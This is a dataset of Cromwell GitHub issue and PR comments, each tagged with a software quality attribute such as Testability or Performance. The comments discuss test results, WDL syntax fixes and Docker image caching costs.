https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094:221,Testability,test,tests,221,"> This change looks safe to me but before merging:; > ; > * As the owners of this code has someone from the BT team(?) cloned this and run it through whatever test(s) are in Travis and/or Jenkins?; Are there some special tests needs to be run for this? If so, no. The tests that were run with the build(travis) passed.; > * Mainly out of curiosity: any idea if the whole AWS backend stopped working where/when/what broke? For example: did the recent dependency upgrades in 68 break something the existing test(s) didn't catch? There wasn't much background in the ticket as to why this fix was suddenly needed, so again just curious.; On EFS backend, the script for each cromwell task gave permission denied error before this fix. It's nothing to do with 68 dependency upgrade. This is caused by changes made for CROM-6682. It affects only the AWS-EFS backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094
https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094:268,Testability,test,tests,268,"> This change looks safe to me but before merging:; > ; > * As the owners of this code has someone from the BT team(?) cloned this and run it through whatever test(s) are in Travis and/or Jenkins?; Are there some special tests needs to be run for this? If so, no. The tests that were run with the build(travis) passed.; > * Mainly out of curiosity: any idea if the whole AWS backend stopped working where/when/what broke? For example: did the recent dependency upgrades in 68 break something the existing test(s) didn't catch? There wasn't much background in the ticket as to why this fix was suddenly needed, so again just curious.; On EFS backend, the script for each cromwell task gave permission denied error before this fix. It's nothing to do with 68 dependency upgrade. This is caused by changes made for CROM-6682. It affects only the AWS-EFS backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094
https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094:505,Testability,test,test,505,"> This change looks safe to me but before merging:; > ; > * As the owners of this code has someone from the BT team(?) cloned this and run it through whatever test(s) are in Travis and/or Jenkins?; Are there some special tests needs to be run for this? If so, no. The tests that were run with the build(travis) passed.; > * Mainly out of curiosity: any idea if the whole AWS backend stopped working where/when/what broke? For example: did the recent dependency upgrades in 68 break something the existing test(s) didn't catch? There wasn't much background in the ticket as to why this fix was suddenly needed, so again just curious.; On EFS backend, the script for each cromwell task gave permission denied error before this fix. It's nothing to do with 68 dependency upgrade. This is caused by changes made for CROM-6682. It affects only the AWS-EFS backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094
https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-892952274:6,Performance,perform,performance,6,"I did performance testing by with a wdl that has 50 outputs. On a cache hit, it attempts to copy the 50 files, so with my change it would also perform 50*2 location lookups. I ran this wdl 10 times without my changes, and 10 times with my changes, with `call_cache_egress` set to ""none"". For each run, I looked at the timestamps for [when the job hashing job is initialized](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/job/EngineJobExecutionActor.scala#L504) , to [when the workflow completes](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/WorkflowExecutionActor.scala#L350). Without my changes, the difference between those timestamps was on average 9 seconds. . With my changes, the difference between those timestamps was on average 16 seconds.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-892952274
https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-892952274:66,Performance,cache,cache,66,"I did performance testing by with a wdl that has 50 outputs. On a cache hit, it attempts to copy the 50 files, so with my change it would also perform 50*2 location lookups. I ran this wdl 10 times without my changes, and 10 times with my changes, with `call_cache_egress` set to ""none"". For each run, I looked at the timestamps for [when the job hashing job is initialized](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/job/EngineJobExecutionActor.scala#L504) , to [when the workflow completes](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/WorkflowExecutionActor.scala#L350). Without my changes, the difference between those timestamps was on average 9 seconds. . With my changes, the difference between those timestamps was on average 16 seconds.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-892952274
https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-892952274:143,Performance,perform,perform,143,"I did performance testing by with a wdl that has 50 outputs. On a cache hit, it attempts to copy the 50 files, so with my change it would also perform 50*2 location lookups. I ran this wdl 10 times without my changes, and 10 times with my changes, with `call_cache_egress` set to ""none"". For each run, I looked at the timestamps for [when the job hashing job is initialized](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/job/EngineJobExecutionActor.scala#L504) , to [when the workflow completes](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/WorkflowExecutionActor.scala#L350). Without my changes, the difference between those timestamps was on average 9 seconds. . With my changes, the difference between those timestamps was on average 16 seconds.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-892952274
https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-892952274:347,Security,hash,hashing,347,"I did performance testing by with a wdl that has 50 outputs. On a cache hit, it attempts to copy the 50 files, so with my change it would also perform 50*2 location lookups. I ran this wdl 10 times without my changes, and 10 times with my changes, with `call_cache_egress` set to ""none"". For each run, I looked at the timestamps for [when the job hashing job is initialized](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/job/EngineJobExecutionActor.scala#L504) , to [when the workflow completes](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/WorkflowExecutionActor.scala#L350). Without my changes, the difference between those timestamps was on average 9 seconds. . With my changes, the difference between those timestamps was on average 16 seconds.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-892952274
https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-892952274:18,Testability,test,testing,18,"I did performance testing by with a wdl that has 50 outputs. On a cache hit, it attempts to copy the 50 files, so with my change it would also perform 50*2 location lookups. I ran this wdl 10 times without my changes, and 10 times with my changes, with `call_cache_egress` set to ""none"". For each run, I looked at the timestamps for [when the job hashing job is initialized](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/job/EngineJobExecutionActor.scala#L504) , to [when the workflow completes](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/WorkflowExecutionActor.scala#L350). Without my changes, the difference between those timestamps was on average 9 seconds. . With my changes, the difference between those timestamps was on average 16 seconds.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-892952274
https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-892952600:13,Testability,test,test,13,"There is one test failing in Travis CI, but it looks unrelated to my change. I believe this PR is ready for another review @mcovarr",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-892952600
https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-895441231:161,Performance,perform,performance,161,"> I believe the next steps for this PR and its sibling are being discussed outside of GitHub. Somewhat. We have a thread open with Kyle on high-level details of performance, complexity, and support. I'd still appreciate a review on the code submitted so far. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-895441231
https://github.com/broadinstitute/cromwell/pull/6435#issuecomment-877234754:30,Availability,failure,failures,30,@aednichols are the Travis CI failures concerning?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6435#issuecomment-877234754
https://github.com/broadinstitute/cromwell/pull/6437#issuecomment-879017997:12,Availability,failure,failures,12,"The Centaur failures here are real, ~reverting to Draft~ closing until I sort this out.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6437#issuecomment-879017997
https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881118722:319,Availability,ERROR,ERROR,319,"The WDL is part of an entire pipeline, that I can't post here. But I can share this:; [WDLTesting.zip](https://github.com/broadinstitute/cromwell/files/6827255/WDLTesting.zip). ```; $ $CROMWELL_HOME/womtool validate WDLTesting/src/wdl/Workflow.wdl ; Failed to import 'WDLTesting/src/wdl/WriteTask.wdl' (reason 1 of 1): ERROR: Unexpected symbol (line 11, col 2) when parsing 'setter'. Expected equal, got ""String"". 	String	input2 = ""Default""; ^. $setter = :equal $e -> $1; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881118722
https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881118722:29,Deployability,pipeline,pipeline,29,"The WDL is part of an entire pipeline, that I can't post here. But I can share this:; [WDLTesting.zip](https://github.com/broadinstitute/cromwell/files/6827255/WDLTesting.zip). ```; $ $CROMWELL_HOME/womtool validate WDLTesting/src/wdl/Workflow.wdl ; Failed to import 'WDLTesting/src/wdl/WriteTask.wdl' (reason 1 of 1): ERROR: Unexpected symbol (line 11, col 2) when parsing 'setter'. Expected equal, got ""String"". 	String	input2 = ""Default""; ^. $setter = :equal $e -> $1; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881118722
https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881118722:207,Security,validat,validate,207,"The WDL is part of an entire pipeline, that I can't post here. But I can share this:; [WDLTesting.zip](https://github.com/broadinstitute/cromwell/files/6827255/WDLTesting.zip). ```; $ $CROMWELL_HOME/womtool validate WDLTesting/src/wdl/Workflow.wdl ; Failed to import 'WDLTesting/src/wdl/WriteTask.wdl' (reason 1 of 1): ERROR: Unexpected symbol (line 11, col 2) when parsing 'setter'. Expected equal, got ""String"". 	String	input2 = ""Default""; ^. $setter = :equal $e -> $1; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881118722
https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881119314:680,Availability,echo,echo,680,"If you don't want to open the zip:. WDLTesting/src/wdl/Workflow.wdl:; ```; version development. import ""WDLTesting/src/wdl/WriteTask.wdl"" as Write. workflow TestingWF; {; 	call Write.WriteTask as Writer; 	{; 		input:; 			input1 = ""Foo""; }. }. ```; WDLTesting/src/wdl/WriteTask.wdl:; ```; version development. #################################################################################################; ## 				This WDL script writes its inputs to stdout				 ##; #################################################################################################. task WriteTask {. 	String	input1	# Variable with no default value; 	String	input2 = ""Default""; 	; 	command <<<; 		echo ""input1 = ${input1}""; 		echo ""input2 = ${input2}""; 	>>>; 	; output {; String	isDone = input2; }; }. ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881119314
https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881119314:709,Availability,echo,echo,709,"If you don't want to open the zip:. WDLTesting/src/wdl/Workflow.wdl:; ```; version development. import ""WDLTesting/src/wdl/WriteTask.wdl"" as Write. workflow TestingWF; {; 	call Write.WriteTask as Writer; 	{; 		input:; 			input1 = ""Foo""; }. }. ```; WDLTesting/src/wdl/WriteTask.wdl:; ```; version development. #################################################################################################; ## 				This WDL script writes its inputs to stdout				 ##; #################################################################################################. task WriteTask {. 	String	input1	# Variable with no default value; 	String	input2 = ""Default""; 	; 	command <<<; 		echo ""input1 = ${input1}""; 		echo ""input2 = ${input2}""; 	>>>; 	; output {; String	isDone = input2; }; }. ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881119314
https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881119314:601,Modifiability,Variab,Variable,601,"If you don't want to open the zip:. WDLTesting/src/wdl/Workflow.wdl:; ```; version development. import ""WDLTesting/src/wdl/WriteTask.wdl"" as Write. workflow TestingWF; {; 	call Write.WriteTask as Writer; 	{; 		input:; 			input1 = ""Foo""; }. }. ```; WDLTesting/src/wdl/WriteTask.wdl:; ```; version development. #################################################################################################; ## 				This WDL script writes its inputs to stdout				 ##; #################################################################################################. task WriteTask {. 	String	input1	# Variable with no default value; 	String	input2 = ""Default""; 	; 	command <<<; 		echo ""input1 = ${input1}""; 		echo ""input2 = ${input2}""; 	>>>; 	; output {; String	isDone = input2; }; }. ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881119314
https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881119314:157,Testability,Test,TestingWF,157,"If you don't want to open the zip:. WDLTesting/src/wdl/Workflow.wdl:; ```; version development. import ""WDLTesting/src/wdl/WriteTask.wdl"" as Write. workflow TestingWF; {; 	call Write.WriteTask as Writer; 	{; 		input:; 			input1 = ""Foo""; }. }. ```; WDLTesting/src/wdl/WriteTask.wdl:; ```; version development. #################################################################################################; ## 				This WDL script writes its inputs to stdout				 ##; #################################################################################################. task WriteTask {. 	String	input1	# Variable with no default value; 	String	input2 = ""Default""; 	; 	command <<<; 		echo ""input1 = ${input1}""; 		echo ""input2 = ${input2}""; 	>>>; 	; output {; String	isDone = input2; }; }. ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881119314
https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881126827:794,Availability,echo,echo,794,"In WDL 1.0 onwards task inputs must be in an `input` block: https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#task-inputs. The following modification validates as expected:. `Workflow.wdl`; ```; version development. import ""WDLTesting/src/wdl/WriteTask.wdl"" as Write. workflow TestingWF; {; call Write.WriteTask as Writer; {; input:; input1 = ""Foo""; }. }; ```. `WriteTask.wdl`; ```; version development. #################################################################################################; ## 				This WDL script writes its inputs to stdout				 ##; #################################################################################################. task WriteTask {. input {; String input1	# Variable with no default value; String input2 = ""Default""; }; 	; command <<<; echo ""input1 = ${input1}""; echo ""input2 = ${input2}""; >>>; 	; output {; String	isDone = input2; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881126827
https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881126827:821,Availability,echo,echo,821,"In WDL 1.0 onwards task inputs must be in an `input` block: https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#task-inputs. The following modification validates as expected:. `Workflow.wdl`; ```; version development. import ""WDLTesting/src/wdl/WriteTask.wdl"" as Write. workflow TestingWF; {; call Write.WriteTask as Writer; {; input:; input1 = ""Foo""; }. }; ```. `WriteTask.wdl`; ```; version development. #################################################################################################; ## 				This WDL script writes its inputs to stdout				 ##; #################################################################################################. task WriteTask {. input {; String input1	# Variable with no default value; String input2 = ""Default""; }; 	; command <<<; echo ""input1 = ${input1}""; echo ""input2 = ${input2}""; >>>; 	; output {; String	isDone = input2; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881126827
https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881126827:716,Modifiability,Variab,Variable,716,"In WDL 1.0 onwards task inputs must be in an `input` block: https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#task-inputs. The following modification validates as expected:. `Workflow.wdl`; ```; version development. import ""WDLTesting/src/wdl/WriteTask.wdl"" as Write. workflow TestingWF; {; call Write.WriteTask as Writer; {; input:; input1 = ""Foo""; }. }; ```. `WriteTask.wdl`; ```; version development. #################################################################################################; ## 				This WDL script writes its inputs to stdout				 ##; #################################################################################################. task WriteTask {. input {; String input1	# Variable with no default value; String input2 = ""Default""; }; 	; command <<<; echo ""input1 = ${input1}""; echo ""input2 = ${input2}""; >>>; 	; output {; String	isDone = input2; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881126827
https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881126827:162,Security,validat,validates,162,"In WDL 1.0 onwards task inputs must be in an `input` block: https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#task-inputs. The following modification validates as expected:. `Workflow.wdl`; ```; version development. import ""WDLTesting/src/wdl/WriteTask.wdl"" as Write. workflow TestingWF; {; call Write.WriteTask as Writer; {; input:; input1 = ""Foo""; }. }; ```. `WriteTask.wdl`; ```; version development. #################################################################################################; ## 				This WDL script writes its inputs to stdout				 ##; #################################################################################################. task WriteTask {. input {; String input1	# Variable with no default value; String input2 = ""Default""; }; 	; command <<<; echo ""input1 = ${input1}""; echo ""input2 = ${input2}""; >>>; 	; output {; String	isDone = input2; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881126827
https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881126827:289,Testability,Test,TestingWF,289,"In WDL 1.0 onwards task inputs must be in an `input` block: https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#task-inputs. The following modification validates as expected:. `Workflow.wdl`; ```; version development. import ""WDLTesting/src/wdl/WriteTask.wdl"" as Write. workflow TestingWF; {; call Write.WriteTask as Writer; {; input:; input1 = ""Foo""; }. }; ```. `WriteTask.wdl`; ```; version development. #################################################################################################; ## 				This WDL script writes its inputs to stdout				 ##; #################################################################################################. task WriteTask {. input {; String input1	# Variable with no default value; String input2 = ""Default""; }; 	; command <<<; echo ""input1 = ${input1}""; echo ""input2 = ${input2}""; >>>; 	; output {; String	isDone = input2; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881126827
https://github.com/broadinstitute/cromwell/issues/6441#issuecomment-882605538:616,Deployability,pipeline,pipeline,616,"The import behavior in `draft-2` is convenient but is essentially a bug. Any Unix tool run in the `WDLTesting/src/wdl/Child` directory would similarly report that `WDLTesting/src/wdl/Child/ChildTask.wdl` does not exist. That's because it's actually located at `../../../../WDLTesting/src/wdl/Child/ChildTask.wdl` relative to that directory. It is acknowledged that many people came to rely on it, which is why fixing it was reserved for a major version. Cromwell does not decide the spec, if you have issues with that please raise them [here](https://github.com/openwdl/wdl). I do not recommend running a production pipeline on version `development` as it is not yet a shipping version and could be subject to change at any time. Career pro tip, calling an open source maintainer's work ""horrible"" is not a winning strategy to get them to help you 😏",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6441#issuecomment-882605538
https://github.com/broadinstitute/cromwell/issues/6441#issuecomment-884312013:912,Deployability,update,update,912,"Thank you @aednichols . 1: I understand that it's free, and I'm only owed what I've paid for. :-). 2: A Unix tool running in the `WDLTesting/src/wdl`directory would report that `WDLTesting/src/wdl/Child/ChildWF.wdl` does not exist. But because it's being called from the main workflow, that still works. It seems to be that you can say ""all file references based off the launching directory work"", or ""no file references based off the launching directory work, you have to evaluate the reference based on the location of the file that made the reference"". Saying ""sometimes it will work, and sometimes it won't. We know you've been depending on this behavior, but we're nuking it anyway""? That, I would say, is rather user unfriendly. 3: All that said, that change, making a called workflow behave significantly differently from the starting workflow, was at least easily dealt with. (I wrote a python script to update the import statements.) But the change that called workflows no longer get passed anything from the JSON file. Given a choice between adding 10 - 50 parameters to each sub-workflow call, and just sticking with draft-2, we're sticking with draft-2. So, thank you for your time, and good luck going forward",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6441#issuecomment-884312013
https://github.com/broadinstitute/cromwell/issues/6441#issuecomment-884312013:632,Integrability,depend,depending,632,"Thank you @aednichols . 1: I understand that it's free, and I'm only owed what I've paid for. :-). 2: A Unix tool running in the `WDLTesting/src/wdl`directory would report that `WDLTesting/src/wdl/Child/ChildWF.wdl` does not exist. But because it's being called from the main workflow, that still works. It seems to be that you can say ""all file references based off the launching directory work"", or ""no file references based off the launching directory work, you have to evaluate the reference based on the location of the file that made the reference"". Saying ""sometimes it will work, and sometimes it won't. We know you've been depending on this behavior, but we're nuking it anyway""? That, I would say, is rather user unfriendly. 3: All that said, that change, making a called workflow behave significantly differently from the starting workflow, was at least easily dealt with. (I wrote a python script to update the import statements.) But the change that called workflows no longer get passed anything from the JSON file. Given a choice between adding 10 - 50 parameters to each sub-workflow call, and just sticking with draft-2, we're sticking with draft-2. So, thank you for your time, and good luck going forward",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6441#issuecomment-884312013
https://github.com/broadinstitute/cromwell/issues/6441#issuecomment-884320618:416,Modifiability,enhance,enhanced,416,"Hello again and thanks for your input. It is a valid observation that changes from `draft-2` are substantial and invasive. The ""draft"" aspect of `draft-2` entailed some behaviors that sounded good in the early experimental phases but proved to be problematic or somehow unmaintainable in the engine codebase. That said `draft-2` is sticking around for the foreseeable future and should provide a stable if no-longer-enhanced platform for your group.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6441#issuecomment-884320618
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-884451767:271,Performance,cache,caches,271,"* ~Created BT-346 to support requester pays GCR pulls.~ Looks like Denis [already asked about this](https://github.com/GoogleCloudPlatform/docker-credential-gcr/issues/36) and it doesn't appear to be on the roadmap for GCR.; * Cromwell does have support for Docker image caches on PAPI v2 beta, but this has not yet been rolled out to Terra (BT-116).; * Tagging in @wnojopra who has been working on regionality concerns (though not involving container repos AFAIK):; ** #6432 ; ** #6332; * I'm curious how requester pays image pulls would work with [Google Artifact Registry](https://cloud.google.com/artifact-registry/docs/transition/transition-from-gcr), the ""evolution"" of GCR which as I understand it is not as closely coupled to buckets.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-884451767
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738:869,Deployability,pipeline,pipeline,869,"Thanks for pointing out the Cromwell/PAPI v2 beta support for docker image caches, I wasn't aware of this feature. . After reading the documentation at https://cromwell.readthedocs.io/en/develop/backends/Google/#docker-image-cache-support, I have a few additional questions about how this could help with the problem described in this issue. . It looks like docker image caching needs to be configured at the Cromwell server level with a manifest file indicating the location of images. Are the images listed in the manifest truly global (as indicated in their paths, ie `projects/broad-dsde-cromwell-dev/global/images/..`), so they won't incur egress to use them to create VMs in different regions? Can they be made public for use by users in other projects?. For an external user already running their own cromwell instance in a different region who wants to run our pipeline, we'd need to publish an image caching configuration stanza and manifest file along with our workflow, and the administrator of the cromwell server would need to modify their server configuration to point to our manifest file and restart the server -- is that correct? If their cromwell server was already configured with a different image cache manifest, is there a way to add a second manifest, or would they have to edit their own cache manifest to include the entries in ours?. If I'm right in my understanding (please correct me if I'm not) it seems like this solution could help, but is quite cumbersome and requires very savvy external users who are willing to take extra steps to help prevent saddling us with egress charges. It would be great if a cache manifest could be configured at the workflow level -- perhaps in the wdl or the workflow options.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738:917,Deployability,configurat,configuration,917,"Thanks for pointing out the Cromwell/PAPI v2 beta support for docker image caches, I wasn't aware of this feature. . After reading the documentation at https://cromwell.readthedocs.io/en/develop/backends/Google/#docker-image-cache-support, I have a few additional questions about how this could help with the problem described in this issue. . It looks like docker image caching needs to be configured at the Cromwell server level with a manifest file indicating the location of images. Are the images listed in the manifest truly global (as indicated in their paths, ie `projects/broad-dsde-cromwell-dev/global/images/..`), so they won't incur egress to use them to create VMs in different regions? Can they be made public for use by users in other projects?. For an external user already running their own cromwell instance in a different region who wants to run our pipeline, we'd need to publish an image caching configuration stanza and manifest file along with our workflow, and the administrator of the cromwell server would need to modify their server configuration to point to our manifest file and restart the server -- is that correct? If their cromwell server was already configured with a different image cache manifest, is there a way to add a second manifest, or would they have to edit their own cache manifest to include the entries in ours?. If I'm right in my understanding (please correct me if I'm not) it seems like this solution could help, but is quite cumbersome and requires very savvy external users who are willing to take extra steps to help prevent saddling us with egress charges. It would be great if a cache manifest could be configured at the workflow level -- perhaps in the wdl or the workflow options.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738:1060,Deployability,configurat,configuration,1060,"Thanks for pointing out the Cromwell/PAPI v2 beta support for docker image caches, I wasn't aware of this feature. . After reading the documentation at https://cromwell.readthedocs.io/en/develop/backends/Google/#docker-image-cache-support, I have a few additional questions about how this could help with the problem described in this issue. . It looks like docker image caching needs to be configured at the Cromwell server level with a manifest file indicating the location of images. Are the images listed in the manifest truly global (as indicated in their paths, ie `projects/broad-dsde-cromwell-dev/global/images/..`), so they won't incur egress to use them to create VMs in different regions? Can they be made public for use by users in other projects?. For an external user already running their own cromwell instance in a different region who wants to run our pipeline, we'd need to publish an image caching configuration stanza and manifest file along with our workflow, and the administrator of the cromwell server would need to modify their server configuration to point to our manifest file and restart the server -- is that correct? If their cromwell server was already configured with a different image cache manifest, is there a way to add a second manifest, or would they have to edit their own cache manifest to include the entries in ours?. If I'm right in my understanding (please correct me if I'm not) it seems like this solution could help, but is quite cumbersome and requires very savvy external users who are willing to take extra steps to help prevent saddling us with egress charges. It would be great if a cache manifest could be configured at the workflow level -- perhaps in the wdl or the workflow options.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738:1603,Energy Efficiency,charge,charges,1603,"Thanks for pointing out the Cromwell/PAPI v2 beta support for docker image caches, I wasn't aware of this feature. . After reading the documentation at https://cromwell.readthedocs.io/en/develop/backends/Google/#docker-image-cache-support, I have a few additional questions about how this could help with the problem described in this issue. . It looks like docker image caching needs to be configured at the Cromwell server level with a manifest file indicating the location of images. Are the images listed in the manifest truly global (as indicated in their paths, ie `projects/broad-dsde-cromwell-dev/global/images/..`), so they won't incur egress to use them to create VMs in different regions? Can they be made public for use by users in other projects?. For an external user already running their own cromwell instance in a different region who wants to run our pipeline, we'd need to publish an image caching configuration stanza and manifest file along with our workflow, and the administrator of the cromwell server would need to modify their server configuration to point to our manifest file and restart the server -- is that correct? If their cromwell server was already configured with a different image cache manifest, is there a way to add a second manifest, or would they have to edit their own cache manifest to include the entries in ours?. If I'm right in my understanding (please correct me if I'm not) it seems like this solution could help, but is quite cumbersome and requires very savvy external users who are willing to take extra steps to help prevent saddling us with egress charges. It would be great if a cache manifest could be configured at the workflow level -- perhaps in the wdl or the workflow options.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738
https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738:391,Modifiability,config,configured,391,"Thanks for pointing out the Cromwell/PAPI v2 beta support for docker image caches, I wasn't aware of this feature. . After reading the documentation at https://cromwell.readthedocs.io/en/develop/backends/Google/#docker-image-cache-support, I have a few additional questions about how this could help with the problem described in this issue. . It looks like docker image caching needs to be configured at the Cromwell server level with a manifest file indicating the location of images. Are the images listed in the manifest truly global (as indicated in their paths, ie `projects/broad-dsde-cromwell-dev/global/images/..`), so they won't incur egress to use them to create VMs in different regions? Can they be made public for use by users in other projects?. For an external user already running their own cromwell instance in a different region who wants to run our pipeline, we'd need to publish an image caching configuration stanza and manifest file along with our workflow, and the administrator of the cromwell server would need to modify their server configuration to point to our manifest file and restart the server -- is that correct? If their cromwell server was already configured with a different image cache manifest, is there a way to add a second manifest, or would they have to edit their own cache manifest to include the entries in ours?. If I'm right in my understanding (please correct me if I'm not) it seems like this solution could help, but is quite cumbersome and requires very savvy external users who are willing to take extra steps to help prevent saddling us with egress charges. It would be great if a cache manifest could be configured at the workflow level -- perhaps in the wdl or the workflow 